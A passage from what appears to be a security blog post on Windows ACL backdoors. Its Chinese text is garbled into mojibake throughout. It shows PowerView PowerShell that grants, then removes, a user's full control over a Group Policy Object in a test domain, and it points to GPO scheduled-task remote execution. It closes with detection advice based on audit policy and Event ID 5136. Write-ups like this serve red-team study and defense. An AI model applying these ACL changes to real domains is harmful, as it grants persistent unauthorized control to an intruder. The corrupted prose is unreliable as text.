<p>å¦‚ä¸‹å›¾ï¼Œ<code class="language-plaintext highlighter-rouge">TestGPO</code>æ˜¯æˆ‘åœ¨æµ‹è¯•ç¯å¢ƒè‡ªå·±æ·»åŠ çš„ï¼Œ<code class="language-plaintext highlighter-rouge">Default Domain Policy</code>å’Œ<code class="language-plaintext highlighter-rouge">Default Domain Controllers Policy</code>æ˜¯åŸŸç¯å¢ƒé»˜è®¤å­˜åœ¨çš„GPO</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-3.png" alt="Alt text" /></p>

<p>(2)æ·»åŠ ç”¨æˆ·test1å¯¹TestGPOçš„å®Œå…¨è®¿é—®æƒé™</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainGPO -Raw -Identity 'TestGPO'
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity test1 -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
</code></pre></div></div>

<p>(3)ç§»é™¤ç”¨æˆ·test1å¯¹TestGPOçš„å®Œå…¨è®¿é—®æƒé™</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainGPO -Raw -Identity 'TestGPO'
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity test1 -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
</code></pre></div></div>

<p>åç»­å¯ä»¥å¯¹GPOè¿›è¡Œæ“ä½œï¼Œæ·»åŠ è®¡åˆ’ä»»åŠ¡ï¼Œå®ç°è®¡åˆ’ä»»åŠ¡çš„è¿œç¨‹æ‰§è¡Œï¼Œå…·ä½“æ–¹æ³•å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C">ã€ŠåŸŸæ¸—é€â€”â€”åˆ©ç”¨GPOä¸­çš„è®¡åˆ’ä»»åŠ¡å®ç°è¿œç¨‹æ‰§è¡Œã€‹</a></p>

<h2 id="0x06-aclæ£€æµ‹">0x06 ACLæ£€æµ‹</h2>
<hr />

<h4 id="1æ–‡ä»¶å’Œæ³¨å†Œè¡¨">1ã€æ–‡ä»¶å’Œæ³¨å†Œè¡¨</h4>

<p>å¯å€ŸåŠ©å¼€æºå·¥å…·WindowsDACLEnumProjectï¼š</p>

<p>https://github.com/nccgroup/WindowsDACLEnumProject</p>

<p>èƒ½å¤Ÿåˆ—å‡ºå­˜åœ¨é£é™©çš„ACL</p>

<h4 id="3åŸŸç¯å¢ƒ">3ã€åŸŸç¯å¢ƒ</h4>

<p>éœ€è¦å¼€å¯é«˜çº§å®‰å…¨å®¡æ ¸ç­–ç•¥ï¼Œå‚è€ƒèµ„æ–™ï¼š</p>

<p>https://blogs.technet.microsoft.com/canitpro/2017/03/29/step-by-step-enabling-advanced-security-audit-policy-via-ds-access/</p>

<p>å¼€å¯ç­–ç•¥åï¼ŒEvent ID 5136ä¼šè®°å½•åŸŸç¯å¢ƒä¸­ACLçš„ä¿®æ”¹ï¼Œå‚è€ƒèµ„æ–™ï¼š</p>

<p>https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=5136</p>

<h2 id="0x07-å°ç»“">0x07 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†Windowsç³»ç»Ÿä¸­çš„ACLåœ¨æ–‡ä»¶ã€æ³¨å†Œè¡¨å’ŒåŸŸç¯å¢ƒä¸‹åé—¨åˆ©ç”¨æ–¹é¢çš„æŠ€å·§ï¼Œå¹¶ç»™å‡ºæ£€æµ‹åé—¨çš„å»ºè®®ã€‚</p>

<p>æˆ‘ä»PowerViewä¸­å­¦åˆ°äº†å¾ˆå¤šåŸŸç¯å¢ƒä¸‹ACLçš„çŸ¥è¯†ï¼Œåœ¨æ­¤æ„Ÿè°¢ä½œè€…çš„å¼€æºã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET